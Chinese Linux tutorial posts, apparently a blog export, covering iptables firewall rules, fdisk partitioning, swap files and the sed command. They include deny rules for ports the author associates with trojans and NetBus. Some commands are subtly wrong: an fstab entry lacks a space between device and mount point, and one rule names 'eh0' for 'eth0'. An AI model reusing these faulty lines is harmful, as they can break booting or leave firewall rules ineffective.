防火墙会从上至下的顺序来读取配置的策略规则，在找到匹配项后就立即结束匹配工作并去执行匹配项中定义的行为（即放行或阻止）。如果在读取完所有的策略规则之后没有匹配项，就去执行默认的策略。一般而言，防火墙策略规则的设置有两种：一种是“通”（即放行），一种是“堵”（即阻止）。当防火墙的默认策略为拒绝时（堵），就要设置允许规则（通），否则谁都进不来；如果防火墙的默认策略为允许时，就要设置拒绝规则，否则谁都能进来，防火墙也就失去了防范的作用。 iptables服务把用于处理或过滤流量的策略条目称之为规则，多条规则可以组成一个规则链，而规则链则依据数据包处理位置的不同进行分类，具体如下： 在进行路由选择前处理数据包（PREROUTING）； 处理流入的数据包（INPUT）； 处理流出的数据包（OUTPUT）； 处理转发的数据包（FORWARD）； 在进行路由选择后处理数据包（POSTROUTING）。 当把Linux系统中的防火墙策略设置为REJECT拒绝动作后，流量发送方会看到端口不可达的响应： 12345678[root@linuxprobe ~]# ping -c 4 192.168.10.10PING 192.168.10.10 (192.168.10.10) 56(84) bytes of data.From 192.168.10.10 icmp_seq=1 Destination Port UnreachableFrom 192.168.10.10 icmp_seq=2 Destination Port UnreachableFrom 192.168.10.10 icmp_seq=3 Destination Port UnreachableFrom 192.168.10.10 icmp_seq=4 Destination Port Unreachable--- 192.168.10.10 ping statistics ---4 packets transmitted, 0 received, +4 errors, 100% packet loss, time 3002ms 而把Linux系统中的防火墙策略修改成DROP拒绝动作后，流量发送方会看到响应超时的提醒。但是流量发送方无法判断流量是被拒绝，还是接收方主机当前不在线： 12345[root@linuxprobe ~]# ping -c 4 192.168.10.10PING 192.168.10.10 (192.168.10.10) 56(84) bytes of data.--- 192.168.10.10 ping statistics ---4 packets transmitted, 0 received, 100% packet loss, time 3000ms 8.2.2 基本的命令参数 iptables是一款基于命令行的防火墙策略管理工具。对于日常的防火墙策略配置来讲，无需深入了解诸如“四表五链”的理论概念，只需要掌握常用的参数并做到灵活搭配即可，这就足以应对日常工作了。 iptables命令可以根据流量的源地址、目的地址、传输协议、服务类型等信息进行匹配，一旦匹配成功，iptables就会根据策略规则所预设的动作来处理这些流量。另外，再次提醒一下，防火墙策略规则的匹配顺序是从上至下的，因此要把较为严格、优先级较高的策略规则放到前面，以免发生错误。表8-1总结归纳了常用的iptables命令参数。再次强调，无需死记硬背这些参数，只需理解掌握即可。 表8-1 iptables中常用的参数以及作用 参数 作用 -P 设置默认策略 -F 清空规则链 -L 查看规则链 -A 在规则链的末尾加入新规则 -I num 在规则链的头部加入新规则 -D num 删除某一条规则 -s 匹配来源地址IP/MASK，加叹号“!”表示除这个IP外 -d 匹配目标地址 -i 网卡名称 匹配从这块网卡流入的数据 -o 网卡名称 匹配从这块网卡流出的数据 -p 匹配协议，如TCP、UDP、ICMP –dport num 匹配目标端口号 –sport num 匹配来源端口号 (1)查看本机关于IPTABLES的设置情况 [root@tp ~]# iptables -L -n (2)清除原有规则. 不管你在安装linux时是否启动了防火墙,如果你想配置属于自己的防火墙,那就清除现在filter的所有规则. [root@tp ~]# iptables -F 清除预设表filter中的所有规则链的规则 [root@tp ~]# iptables -X 清除预设表filter中使用者自定链中的规则 永久保存. [root@tp ~]# /etc/rc.d/init.d/iptables save 这样就可以写到/etc/sysconfig/iptables文件里了.写入后记得把防火墙重起一下,才能起作用. [root@tp ~]# service iptables restart (3)设定预设规则 [root@tp ~]# iptables -P INPUT DROP [root@tp ~]# iptables -P OUTPUT ACCEPT [root@tp ~]# iptables -P FORWARD DROP 上面的意思是,当超出了IPTABLES里filter表里的两个链规则(INPUT,FORWARD)时,不在这两个规则里的数据包怎么处理呢,那就是DROP(放弃).应该说这样配置是很安全的.我们要控制流入数据包 而对于OUTPUT链,也就是流出的包我们不用做太多限制,而是采取ACCEPT,也就是说,不在着个规则里的包怎么办呢,那就是通过. 可以看出INPUT,FORWARD两个链采用的是允许什么包通过,而OUTPUT链采用的是不允许什么包通过. 这样设置还是挺合理的,当然你也可以三个链都DROP,但这样做我认为是没有必要的,而且要写的规则就会增加.但如果你只想要有限的几个规则是,如只做WEB服务器.还是推荐三个链都是DROP. 注:如果你是远程SSH登陆的话,当你输入第一个命令回车的时候就应该掉了.因为你没有设置任何规则.怎么办,去本机操作呗! (4)添加规则. 首先添加INPUT链,INPUT链的默认规则是DROP,所以我们就写需要ACCETP(通过)的链 为了能采用远程SSH登陆,我们要开启22端口. [root@tp ~]# iptables -A INPUT -p tcp --dport 22 -j ACCEPT [root@tp ~]# iptables -A OUTPUT -p tcp --sport 22 -j ACCEPT (注:这个规则,如果你把OUTPUT 设置成DROP的就要写上这一部,好多人都是望了写这一部规则导致,始终无法SSH.在远程一下,是不是好了. 其他的端口也一样,如果开启了web服务器,OUTPUT设置成DROP的话,同样也要添加一条链: [root@tp ~]# iptables -A OUTPUT -p tcp --sport 80 -j ACCEPT ,其他同理.) 如果做了WEB服务器,开启80端口. [root@tp ~]# iptables -A INPUT -p tcp --dport 80 -j ACCEPT 如果做了邮件服务器,开启25,110端口. [root@tp ~]# iptables -A INPUT -p tcp --dport 110 -j ACCEPT [root@tp ~]# iptables -A INPUT -p tcp --dport 25 -j ACCEPT 如果做了FTP服务器,开启21端口 [root@tp ~]# iptables -A INPUT -p tcp --dport 21 -j ACCEPT [root@tp ~]# iptables -A INPUT -p tcp --dport 20 -j ACCEPT 如果做了DNS服务器,开启53端口 [root@tp ~]# iptables -A INPUT -p tcp --dport 53 -j ACCEPT 如果你还做了其他的服务器,需要开启哪个端口,照写就行了. 上面主要写的都是INPUT链,凡是不在上面的规则里的,都DROP 允许icmp包通过,也就是允许ping, [root@tp ~]# iptables -A OUTPUT -p icmp -j ACCEPT (OUTPUT设置成DROP的话) [root@tp ~]# iptables -A INPUT -p icmp -j ACCEPT (INPUT设置成DROP的话) 允许loopback!(不然会导致DNS无法正常关闭等问题) IPTABLES -A INPUT -i lo -p all -j ACCEPT (如果是INPUT DROP) IPTABLES -A OUTPUT -o lo -p all -j ACCEPT(如果是OUTPUT DROP) 下面写OUTPUT链,OUTPUT链默认规则是ACCEPT,所以我们就写需要DROP(放弃)的链. 减少不安全的端口连接 [root@tp ~]# iptables -A OUTPUT -p tcp --sport 31337 -j DROP [root@tp ~]# iptables -A OUTPUT -p tcp --dport 31337 -j DROP 有些些特洛伊木马会扫描端口31337到31340(即黑客语言中的 elite 端口)上的服务。既然合法服务都不使用这些非标准端口来通信,阻塞这些端口能够有效地减少你的网络上可能被感染的机器和它们的远程主服务器进行独立通信的机会 还有其他端口也一样,像:31335、27444、27665、20034 NetBus、9704、137-139（smb）,2049(NFS)端口也应被禁止,我在这写的也不全,有兴趣的朋友应该去查一下相关资料. 当然出入更安全的考虑你也可以包OUTPUT链设置成DROP,那你添加的规则就多一些,就像上边添加 允许SSH登陆一样.照着写就行了. 下面写一下更加细致的规则,就是限制到某台机器 如:我们只允许192.168.0.3的机器进行SSH连接 [root@tp ~]# iptables -A INPUT -s 192.168.0.3 -p tcp --dport 22 -j ACCEPT 如果要允许,或限制一段IP地址可用 192.168.0.0/24 表示192.168.0.1-255端的所有IP. 24表示子网掩码数.但要记得把 /etc/sysconfig/iptables 里的这一行删了. -A INPUT -p tcp -m tcp --dport 22 -j ACCEPT 因为它表示所有地址都可以登陆. 或采用命令方式: [root@tp ~]# iptables -D INPUT -p tcp --dport 22 -j ACCEPT 然后保存,我再说一边,反是采用命令的方式,只在当时生效,如果想要重起后也起作用,那就要保存.写入到/etc/sysconfig/iptables文件里. [root@tp ~]# /etc/rc.d/init.d/iptables save 这样写 !192.168.0.3 表示除了192.168.0.3的ip地址 其他的规则连接也一样这么设置. 在下面就是FORWARD链,FORWARD链的默认规则是DROP,所以我们就写需要ACCETP(通过)的链,对正在转发链的监控. 开启转发功能,(在做NAT时,FORWARD默认规则是DROP时,必须做) [root@tp ~]# iptables -A FORWARD -i eth0 -o eth1 -m state --state RELATED,ESTABLISHED -j ACCEPT [root@tp ~]# iptables -A FORWARD -i eth1 -o eh0 -j ACCEPT 丢弃坏的TCP包 [root@tp ~]#iptables -A FORWARD -p TCP ! --syn -m state --state NEW -j DROP 处理IP碎片数量,防止攻击,允许每秒100个 [root@tp ~]#iptables -A FORWARD -f -m limit --limit 100/s --limit-burst 100 -j ACCEPT 设置ICMP包过滤,允许每秒1个包,限制触发条件是10个包. [root@tp ~]#iptables -A FORWARD -p icmp -m limit --limit 1/s --limit-burst 10 -j ACCEPT 我在前面只所以允许ICMP包通过,就是因为我在这里有限制. https://www.linuxprobe.com/chapter-08.html https://www.cnblogs.com/alimac/p/5848372.html"},{"title":"Linux主分区-扩展分区-逻辑分区","date":"2020-10-03","updated":"2024-03-19","path":"2020/10/03/Linux主分区-扩展分区-逻辑分区/","text":"常见硬件对应于 Linux 下的文件（/dev目录下） 装置 装置在Linux内的档名 SCSI/SATA/U盘硬盘机 /dev/sd[a-p] U盘 /dev/sd[a-p]（与SATA相同） VirtI/O界面 /dev/vd[a-p]（用于虚拟机内） 软盘机 /dev/fd[0-1] 打印机 25针: /dev/lp[0-2]; USB: /dev/usb/lp[0-15] 鼠标 PS2: /dev/psaux; USB: /dev/usb/mouse[0-15] CDROM/DVDROM /dev/scd[0-1]（通用）; /dev/sr[0-1]（通用，CentOS较常见） 当前CDROM/DVDROM /dev/cdrom 当前的鼠标 /dev/mouse 磁带机 IDE: /dev/ht0; SATA/SCSI: /dev/st0 IDE硬盘机 /dev/hd[a-d]（近乎被淘汰） 由于现在的IDE设备已经很少见了，所以一般的硬盘设备都会是以“/dev/sd”开头的。而一台主机上可以有多块硬盘，因此系统采用a～p来代表16块不同的硬盘（默认从a开始分配），而且硬盘的分区编号也很有讲究： 主分区或扩展分区的编号从1开始，到4结束； 逻辑分区从编号5开始。 知识点1: /dev目录中sda设备之所以是a，并不是由插槽决定的，而是由系统内核的识别顺序来决定的，而恰巧很多主板的插槽顺序就是系统内核的识别顺序，因此才会被命名为/dev/sda。在使用iSCSI网络存储设备时就会发现，明明主板上第二个插槽是空着的，但系统却能识别到/dev/sdb这个设备就是这个道理。 知识点2: 分区的数字编码不一定是强制顺延下来的，也有可能是手工指定的。因此sda3只能表示是编号为3的分区，而不能判断sda设备上已经存在了3个分区。 分析下图: 首先，/dev/目录中保存的应当是硬件设备文件；其次，sd表示是存储设备；然后，a表示系统中同类接口中第一个被识别到的设备，最后，5表示这个设备是一个逻辑分区。一言以蔽之，“/dev/sda5”表示的就是“这是系统中第一块被识别到的硬件设备中分区编号为5的逻辑分区的设备文件”。 硬盘分区 MBR分区方式 分区作用： ①主分区：主要是用来启动操作系统的，它主要放的是操作系统的启动或引导程序，/boot分区最好放在主分区上； ②扩展分区是不能使用的，它只是做为逻辑分区的容器存在的，先创建一个扩展分区，在扩展分区之上创建逻辑分区； ③我们真正存放数据的是主分区和逻辑分区，大量数据都放在逻辑分区中。 硬盘设备是由大量的扇区组成的，每个扇区的容量为512字节。其中第一个扇区最重要，它里面保存着**主引导记录(Master Boot Record, MBR)占用446字节,与分区表(partition table)**信息,占用64字节，结束符占用2字节；其中分区表中每记录一个分区信息就需要16字节，这样一来最多只有4个分区信息可以写到第一个扇区中，这4个分区就是4个主分区。第一个扇区中的数据信息如图6-3所示。 现在，问题来了—第一个扇区最多只能创建出4个分区？于是为了解决分区个数不够的问题，可以将第一个扇区的分区表中16字节（原本要写入主分区信息）的空间（称之为扩展分区）拿出来指向另外一个分区。也就是说，扩展分区其实并不是一个真正的分区，而更像是一个占用16字节分区表空间的指针—一个指向另外一个分区的指针。这样一来，用户一般会选择使用3个主分区加1个扩展分区的方法，然后在扩展分区中创建出数个逻辑分区，从而来满足多分区（大于4个）的需求。主分区、扩展分区、逻辑分区可以像下图那样来规划。 所谓扩展分区，严格地讲它不是一个实际意义的分区，它仅仅是一个指向下一个分区的指针，这种指针结构将形成一个单向链表。 小总结： 主要分割与扩展分配最多可以有四笔(硬盘的限制) 扩展分配最多只能有一个(操作系统的限制) 逻辑分割是由扩展分配持续切割出来的分割槽； 能够被格式化后，作为数据存取的分割槽为主要分割与逻辑分割。扩展分配无法格式化； 逻辑分割的数量依操作系统而不同，在Linux系统中，IDE硬盘最多有59个逻辑分割(5号到63号)， SATA硬盘则有11个逻辑分割(5号到15号)。 缺点： 操作系统无法识别大于 2.2T 以上的磁盘容量； MBR 仅有一个区块，若被破坏后，无法或很难恢复； 存放 boot loader 的区块仅有 446 bytes，无法容纳较多的代码。 GUID partition table, GPT 分区方式 留坑… 分区表链的查找 分区表链实际上相当于一个单向链表结构。第一个分区表，也即主分区表，可以有一项 描述扩展分区。而这一项就相当于指针，指向扩展的分区。然后我们根据该指针来到扩展分 区起始柱面的0头1扇区，找到第二个分区表。对于该分区表，通常情况下：第一项描述了扩展分区中第一个分区的信息，第二项描述下一个分区，而这第二项就相当于指向第二个分 区的指针，第三项，第四项一般均为0。我们可以根据该指针来到扩展分区中第二个分区起 始柱面的0头1扇区，找到第三个分区表。以此类推，直到最后一个分区表。而最后一个分 区表只有第一项有信息，余下三项均为0.相当于其指针为空.所以只要找到了一个分区表就可 以推导找出其后面所有分区表。不过该分区表前面的分区表就不好推导出来了。但令人高兴 的是这个链表的头节点，也即主分区表的位置是固定的位于（0柱面，0磁头，1扇区）处， 我们可以很轻易的找到它，然后把剩下的所有分区表一一找到。 分区链表查找例子 Linux 创建主分区演示： 工作环境中为English环境，方便阅读在国语环境下演示 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899#第一步：添加磁盘创建主分区╭─root@localhost.localdomain ~ ╰─➤ ls /dev/sd* #查看磁盘/dev/sda /dev/sda1 /dev/sda2 /dev/sdb /dev/sdc /dev/sdd /dev/sde╭─root@localhost.localdomain ~ ╰─➤ fdisk /dev/sdb #管理分区 欢迎使用 fdisk (util-linux 2.23.2)。更改将停留在内存中，直到您决定将更改写入磁盘。使用写入命令前请三思。Device does not contain a recognized partition table使用磁盘标识符 0x9fccbf7c 创建新的 DOS 磁盘标签。命令(输入 m 获取帮助)：n #新建分区Partition type: #分区类型 p primary (0 primary, 0 extended, 4 free) #p---&gt;主分区 e extended #e ---&gt; 扩展分区Select (default p): p #选择主分区分区号 (1-4，默认 1)：起始 扇区 (2048-41943039，默认为 2048)： #分区磁盘的起始位，默认值，回车就好！将使用默认值 2048Last 扇区, +扇区 or +size&#123;K,M,G&#125; (2048-41943039，默认为 41943039)：+5G #磁盘大小选择，加号不能省略，回车即可分区 1 已设置为 Linux 类型，大小设为 5 GiB命令(输入 m 获取帮助)：P #查询分区是否创建成功磁盘 /dev/sdb：21.5 GB, 21474836480 字节，41943040 个扇区Units = 扇区 of 1 * 512 = 512 bytes扇区大小(逻辑/物理)：512 字节 / 512 字节I/O 大小(最小/最佳)：512 字节 / 512 字节磁盘标签类型：dos磁盘标识符：0x9fccbf7c 设备 Boot Start End Blocks Id System/dev/sdb1 2048 10487807 5242880 83 Linux #sdb1命令(输入 m 获取帮助)：w #保存退出The partition table has been altered!Calling ioctl() to re-read partition table.正在同步磁盘。#第二步：查看磁盘╭─root@localhost.localdomain ~ ╰─➤ ls /dev/sd*/dev/sda /dev/sda1 /dev/sda2 /dev/sdb /dev/sdb1 /dev/sdc /dev/sdd /dev/sde#第三步：格式化成xfs文件系统╭─root@localhost.localdomain ~ ╰─➤ mkfs.xfs /dev/sdb1meta-data=/dev/sdb1 isize=512 agcount=4, agsize=327680 blks = sectsz=512 attr=2, projid32bit=1 = crc=1 finobt=0, sparse=0data = bsize=4096 blocks=1310720, imaxpct=25 = sunit=0 swidth=0 blksnaming =version 2 bsize=4096 ascii-ci=0 ftype=1log =internal log bsize=4096 blocks=2560, version=2 = sectsz=512 sunit=0 blks, lazy-count=1realtime =none extsz=4096 blocks=0, rtextents=0#第四步：挂载至本地目录╭─root@localhost.localdomain ~ ╰─➤ mkdir /xfs_du #创建本地目录 ╭─root@localhost.localdomain ~ ╰─➤ mount /dev/sdb1 /xfs_du #使用mount挂载 mount 磁盘 目录#第五步：查看挂载信息╭─root@localhost.localdomain ~ ╰─➤ df -h文件系统 容量 已用 可用 已用% 挂载点/dev/mapper/cl-root 17G 4.7G 13G 28% /devtmpfs 473M 0 473M 0% /devtmpfs 489M 88K 489M 1% /dev/shmtmpfs 489M 7.1M 482M 2% /runtmpfs 489M 0 489M 0% /sys/fs/cgroup/dev/sda1 1014M 173M 842M 18% /boottmpfs 98M 8.0K 98M 1% /run/user/0/dev/sr0 4.1G 4.1G 0 100% /run/media/root/CentOS 7 x86_64/dev/sdb1 5.0G 33M 5.0G 1% /xfs_du#第六步：开机自动挂载╭─root@localhost.localdomain ~ ╰─➤ echo &quot;/dev/sdb1/xfs_du xfs defaults 0 0&quot; &gt;&gt; /etc/fstab#开机自动挂载方法2：echo “mount /dev/sdb1 /xfs_du” &gt;&gt; /etc/rc.localchmod +x /etc/rc.d/rc.local #给个执行权限# /etc/rc.local 是使用者自订开机启动程序的文件,把需要开机自动运行的程序写在这个脚本里 fdisk分区演示–创建逻辑分区 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106# 第一步：fdisk添加扩展分区╭─root@du ~ ╰─➤ fdisk /dev/sdbWelcome to fdisk (util-linux 2.23.2).Changes will remain in memory only, until you decide to write them.Be careful before using the write command.Command (m for help): n #添加新分区Partition type:p primary (1 primary, 0 extended, 3 free)e extendedSelect (default p): e #选择扩展分区Partition number (2-4, default 2):First sector (10487808-41943039, default 10487808):Using default value 10487808Last sector, +sectors or +size&#123;K,M,G&#125; (10487808-41943039, default 41943039): +5G #5G大小Partition 2 of type Extended and of size 5 GiB is setCommand (m for help): P #查看分区Disk /dev/sdb: 21.5 GB, 21474836480 bytes, 41943040 sectorsUnits = sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk label type: dosDisk identifier: 0xe140b235Device Boot Start End Blocks Id System/dev/sdb1 2048 10487807 5242880 83 Linux/dev/sdb2 10487808 20973567 5242880 5 ExtendedCommand (m for help): w #保存退出The partition table has been altered!Calling ioctl() to re-read partition table.Syncing disks.#第二步：创建逻辑分区╭─root@du ~ ╰─➤ fdisk /dev/sdbWelcome to fdisk (util-linux 2.23.2).Changes will remain in memory only, until you decide to write them.Be careful before using the write command.Command (m for help): nPartition type:p primary (1 primary, 1 extended, 2 free)l logical (numbered from 5)Select (default p): l #创建逻辑分区Adding logical partition 5First sector (10489856-20973567, default 10489856):Using default value 10489856Last sector, +sectors or +size&#123;K,M,G&#125; (10489856-20973567, default 20973567): +10G #逻辑分区大小不能超过扩展分区大小Value out of range.Last sector, +sectors or +size&#123;K,M,G&#125; (10489856-20973567, default 20973567): +2gUnsupported suffix: ‘g’.Supported: 10^N: KB (KiloByte), MB (MegaByte), GB (GigaByte)2^N: K (KibiByte), M (MebiByte), G (GibiByte)Last sector, +sectors or +size&#123;K,M,G&#125; (10489856-20973567, default 20973567): +2GPartition 5 of type Linux and of size 2 GiB is setCommand (m for help): PDisk /dev/sdb: 21.5 GB, 21474836480 bytes, 41943040 sectorsUnits = sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 bytesDisk label type: dosDisk identifier: 0xe140b235Device Boot Start End Blocks Id System/dev/sdb1 2048 10487807 5242880 83 Linux/dev/sdb2 10487808 20973567 5242880 5 Extended/dev/sdb5 10489856 14684159 2097152 83 LinuxCommand (m for help): WThe partition table has been altered!Calling ioctl() to re-read partition table.Syncing disks.#第三步：创建文件系统╭─root@du ~ ╰─➤ ls /dev/sd*/dev/sda /dev/sda1 /dev/sda2 /dev/sdb /dev/sdb1 /dev/sdb2 /dev/sdb5╭─root@du ~ ╰─➤ mkfs.xfs /dev/sdb5meta-data=/dev/sdb5 isize=512 agcount=4, agsize=131072 blks= sectsz=512 attr=2, projid32bit=1= crc=1 finobt=0, sparse=0data = bsize=4096 blocks=524288, imaxpct=25= sunit=0 swidth=0 blksnaming =version 2 bsize=4096 ascii-ci=0 ftype=1log =internal log bsize=4096 blocks=2560, version=2= sectsz=512 sunit=0 blks, lazy-count=1realtime =none extsz=4096 blocks=0, rtextents=0#第四步：开机自动挂载╭─root@du ~ ╰─➤ echo “mount /dev/sdb5 /xfs_du” &gt;&gt; /etc/rc.local 本地目录创建交换分区 第一步：创建目录 1mkdir /swap 第二步：创建空文件 1dd if=/dev/zero of=/swap/swap bs=2M count=2014 第三步：格式化为swap格式 1mkswap /swap/swap 第四步：写入文件/etc/fstab 开机自动挂载 1echo &quot;/swap/swap swap swap defaults 0 0&quot; &gt;&gt; /etc/fstab 第五步：修改权限,挂载 123chmod 0600 /swap/swapmount -a 第六步：开启swap 12345swapon -a[root@node1 ~]# free -h total used free shared buff/cache availableMem: 976M 321M 60M 9.5M 594M 466MSwap: 5.9G 221M 5.7G 最后：关闭swap 1swapoff -a https://baike.baidu.com/item/硬盘分区表 https://www.cnblogs.com/hiwangzi/p/7640995.html https://www.linuxprobe.com/chapter-06.html https://www.cnblogs.com/du-z/p/10870162.html"},{"title":"sed命令","date":"2020-10-03","updated":"2024-03-19","path":"2020/10/03/sed命令/","text":"https://www.runoob.com/linux/linux-comm-sed.html Linux sed 命令 Linux 命令大全 Linux sed 命令是利用脚本来处理文本文件。 sed 可依照脚本的指令来处理、编辑文本文件。 Sed 主要用来自动编辑一个或多个文件、简化对文件的反复操作、编写转换程序等。 语法 1sed [-hnV][-e&lt;script&gt;][-f&lt;script文件&gt;][文本文件] 参数说明： -e&lt;script&gt;或–expression=&lt;script&gt; 以选项中指定的script来处理输入的文本文件。 -f&lt;script文件&gt;或–file=&lt;script文件&gt; 以选项中指定的script文件来处理输入的文本文件。 -h或–help 显示帮助。 -n或–quiet或–silent 仅显示script处理后的结果。 -V或–version 显示版本信息。 动作说明： a ：新增， a 的后面可以接字串，而这些字串会在新的一行出现(目前的下一行)～ c ：取代， c 的后面可以接字串，这些字串可以取代 n1,n2 之间的行！ d ：删除，因为是删除啊，所以 d 后面通常不接任何咚咚； i ：插入， i 的后面可以接字串，而这些字串会在新的一行出现(目前的上一行)； p ：打印，亦即将某个选择的数据印出。通常 p 会与参数 sed -n 一起运行～ s ：取代，可以直接进行取代的工作哩！通常这个 s 的动作可以搭配正规表示法！例如 1,20s/old/new/g 就是啦！ 实例 在testfile文件的第四行后添加一行，并将结果输出到标准输出，在命令行提示符下输入如下命令： 1sed -e 4a\\newLine testfile 首先查看testfile中的内容如下： 12345$ cat testfile #查看testfile 中的内容 HELLO LINUX! Linux is a free unix-type opterating system. This is a linux testfile! Linux test 使用sed命令后，输出结果如下： 123456$ sed -e 4a\\newline testfile #使用sed 在第四行后添加新字符串 HELLO LINUX! #testfile文件原有的内容 Linux is a free unix-type opterating system. This is a linux testfile! Linux test newline 以行为单位的新增/删除 将 /etc/passwd 的内容列出并且列印行号，同时，请将第 2~5 行删除！ 12345[root@www ~]# nl /etc/passwd | sed &#x27;2,5d&#x27;1 root:x:0:0:root:/root:/bin/bash6 sync:x:5:0:sync:/sbin:/bin/sync7 shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown.....(后面省略)..... sed 的动作为 ‘2,5d’ ，那个 d 就是删除！因为 2-5 行给他删除了，所以显示的数据就没有 2-5 行罗～ 另外，注意一下，原本应该是要下达 sed -e 才对，没有 -e 也行啦！同时也要注意的是， sed 后面接的动作，请务必以 ‘’ 两个单引号括住喔！ 只要删除第 2 行 1nl /etc/passwd | sed &#x27;2d&#x27; 要删除第 3 到最后一行 1nl /etc/passwd | sed &#x27;3,$d&#x27; 在第二行后(亦即是加在第三行)加上『drink tea?』字样！ 123456[root@www ~]# nl /etc/passwd | sed &#x27;2a drink tea&#x27;1 root:x:0:0:root:/root:/bin/bash2 bin:x:1:1:bin:/bin:/sbin/nologindrink tea3 daemon:x:2:2:daemon:/sbin:/sbin/nologin.....(后面省略)..... 那如果是要在第二行前 1nl /etc/passwd | sed &#x27;2i drink tea&#x27; 如果是要增加两行以上，在第二行后面加入两行字，例如 Drink tea or … 与 drink beer? 12345678[root@www ~]# nl /etc/passwd | sed &#x27;2a Drink tea or ......\\&gt; drink beer ?&#x27;1 root:x:0:0:root:/root:/bin/bash2 bin:x:1:1:bin:/bin:/sbin/nologinDrink tea or ......drink beer ?3 daemon:x:2:2:daemon:/sbin:/sbin/nologin.....(后面省略)..... 每一行之间都必须要以反斜杠『 \\ 』来进行新行的添加喔！所以，上面的例子中，我们可以发现在第一行的最后面就有 \\ 存在。 以行为单位的替换与显示 将第2-5行的内容取代成为『No 2-5 number』呢？ 12345[root@www ~]# nl /etc/passwd | sed &#x27;2,5c No 2-5 number&#x27;1 root:x:0:0:root:/root:/bin/bashNo 2-5 number6 sync:x:5:0:sync:/sbin:/bin/sync.....(后面省略)..... 透过这个方法我们就能够将数据整行取代了！ 仅列出 /etc/passwd 文件内的第 5-7 行 1234[root@www ~]# nl /etc/passwd | sed -n &#x27;5,7p&#x27;5 lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin6 sync:x:5:0:sync:/sbin:/bin/sync7 shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown 可以透过这个 sed 的以行为单位的显示功能， 就能够将某一个文件内的某些行号选择出来显示。 数据的搜寻并显示 搜索 /etc/passwd有root关键字的行 12345678nl /etc/passwd | sed &#x27;/root/p&#x27;1 root:x:0:0:root:/root:/bin/bash1 root:x:0:0:root:/root:/bin/bash2 daemon:x:1:1:daemon:/usr/sbin:/bin/sh3 bin:x:2:2:bin:/bin:/bin/sh4 sys:x:3:3:sys:/dev:/bin/sh5 sync:x:4:65534:sync:/bin:/bin/sync....下面忽略 如果root找到，除了输出所有行，还会输出匹配行。 使用-n的时候将只打印包含模板的行。 12nl /etc/passwd | sed -n &#x27;/root/p&#x27;1 root:x:0:0:root:/root:/bin/bash 数据的搜寻并删除 删除/etc/passwd所有包含root的行，其他行输出 12345nl /etc/passwd | sed &#x27;/root/d&#x27;2 daemon:x:1:1:daemon:/usr/sbin:/bin/sh3 bin:x:2:2:bin:/bin:/bin/sh....下面忽略#第一行的匹配root已经删除了 数据的搜寻并执行命令 搜索/etc/passwd,找到root对应的行，执行后面花括号中的一组命令，每个命令之间用分号分隔，这里把bash替换为blueshell，再输出这行： 12nl /etc/passwd | sed -n &#x27;/root/&#123;s/bash/blueshell/;p;q&#125;&#x27; 1 root:x:0:0:root:/root:/bin/blueshell 最后的q是退出。 数据的搜寻并替换 除了整行的处理模式之外， sed 还可以用行为单位进行部分数据的搜寻并取代。基本上 sed 的搜寻与替代的与 vi 相当的类似！他有点像这样： 1sed &#x27;s/要被取代的字串/新的字串/g&#x27; 先观察原始信息，利用 /sbin/ifconfig 查询 IP 123456[root@www ~]# /sbin/ifconfig eth0eth0 Link encap:Ethernet HWaddr 00:90:CC:A6:34:84inet addr:192.168.1.100 Bcast:192.168.1.255 Mask:255.255.255.0inet6 addr: fe80::290:ccff:fea6:3484/64 Scope:LinkUP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1.....(以下省略)..... 本机的ip是192.168.1.100。 将 IP 前面的部分予以删除 12[root@www ~]# /sbin/ifconfig eth0 | grep &#x27;inet addr&#x27; | sed &#x27;s/^.*addr://g&#x27;192.168.1.100 Bcast:192.168.1.255 Mask:255.255.255.0 接下来则是删除后续的部分，亦即： 192.168.1.100 Bcast:192.168.1.255 Mask:255.255.255.0 将 IP 后面的部分予以删除 12[root@www ~]# /sbin/ifconfig eth0 | grep &#x27;inet addr&#x27; | sed &#x27;s/^.*addr://g&#x27; | sed &#x27;s/Bcast.*$//g&#x27;192.168.1.100 多点编辑 一条sed命令，删除/etc/passwd第三行到末尾的数据，并把bash替换为blueshell 123nl /etc/passwd | sed -e &#x27;3,$d&#x27; -e &#x27;s/bash/blueshell/&#x27;1 root:x:0:0:root:/root:/bin/blueshell2 daemon:x:1:1:daemon:/usr/sbin:/bin/sh -e表示多点编辑，第一个编辑命令删除/etc/passwd第三行到末尾的数据，第二条命令搜索bash替换为blueshell。 直接修改文件内容(危险动作) sed 可以直接修改文件的内容，不必使用管道命令或数据流重导向！ 不过，由於这个动作会直接修改到原始的文件，所以请你千万不要随便拿系统配置来测试！ 我们还是使用文件 regular_express.txt 文件来测试看看吧！ regular_express.txt 文件内容如下： 1234567[root@www ~]# cat regular_express.txt runoob.google.taobao.facebook.zhihu-weibo- 利用 sed 将 regular_express.txt 内每一行结尾若为 . 则换成 ! 12345678[root@www ~]# sed -i &#x27;s/\\.$/\\!/g&#x27; regular_express.txt[root@www ~]# cat regular_express.txt runoob!google!taobao!facebook!zhihu-weibo- :q:q 利用 sed 直接在 regular_express.txt 最后一行加入 # This is a test: 123456789[root@www ~]# sed -i &#x27;$a # This is a test&#x27; regular_express.txt[root@www ~]# cat regular_express.txt runoob!google!taobao!facebook!zhihu-weibo-# This is a test 由於 $ 代表的是最后一行，而 a 的动作是新增，因此该文件最后新增 # This is a test！ sed 的 -i 选项可以直接修改文件内容，这功能非常有帮助！举例来说，如果你有一个 100 万行的文件，你要在第 100 行加某些文字，此时使用 vim 可能会疯掉！因为文件太大了！那怎办？就利用 sed 啊！透过 sed 直接修改/取代的功能，你甚至不需要使用 vim 去修订！ 1 追加行的说明： 1sed -e 4a\\newline testfile a 动作是在匹配的行之后追加字符串，追加的字符串中可以包含换行符（实现追加多行的情况）。 追加一行的话前后都不需要添加换行符 \\n，只有追加多行时在行与行之间才需要添加换行符(最后一行最后也无需添加，添加的话会多出一个空行)。 man sed 信息： 1Append text, which has each embedded newline preceded by a backslash. 例如： 4 行之后添加一行： 1sed -e &#x27;4 a newline&#x27; testfile 4 行之后追加 2 行： 